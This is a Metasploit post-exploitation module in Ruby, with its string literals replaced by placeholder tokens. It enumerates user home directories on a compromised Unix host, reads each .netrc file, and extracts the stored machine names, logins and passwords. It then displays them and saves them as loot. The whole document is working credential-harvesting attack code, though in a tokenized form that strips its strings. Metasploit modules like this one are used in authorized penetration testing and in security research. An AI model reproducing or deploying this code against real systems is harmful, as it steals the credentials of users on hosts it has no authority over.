require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: File include Msf :: Post :: Unix def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > <str> , <str> = > [ <str> ] ) ) end def run cred_table = Rex :: Ui :: Text :: Table . new ( <str> = > <str> , <str> = > <int> , <str> = > [ <str> , <str> , <str> , ] ) creds = [ ] enum_user_directories . each do | user_dir | netrc_file = user_dir + <str> cred = { } begin print_status ( <str> netrc_file <str> ) cmd_exec ( <str> netrc_file <str> netrc_file <str> ) . each_line do | netrc_line | netrc_line . strip! if ( netrc_line =~ <str> ) if ( cred [ <str> ] ) creds << cred cred = { } end cred [ <str> ] = $1 end if ( netrc_line =~ <str> ) cred [ <str> ] = $1 end if ( netrc_line =~ <str> ) cred [ <str> ] = $1 end end creds << cred if ( cred [ <str> ] and cred [ <str> ] and cred [ <str> ] ) rescue :: Exception = > e print_error ( <str> netrc_file <str> e . to_s <str> ) end end creds . each do | cred | cred_table << [ cred [ <str> ] , cred [ <str> ] , cred [ <str> ] ] end if cred_table . rows . empty? print_status ( <str> ) else print_line ( <str> + cred_table . to_s ) p = store_loot ( <str> , <str> , session , cred_table . to_csv , <str> , <str> ) print_status ( <str> p . to_s <str> ) end end end 
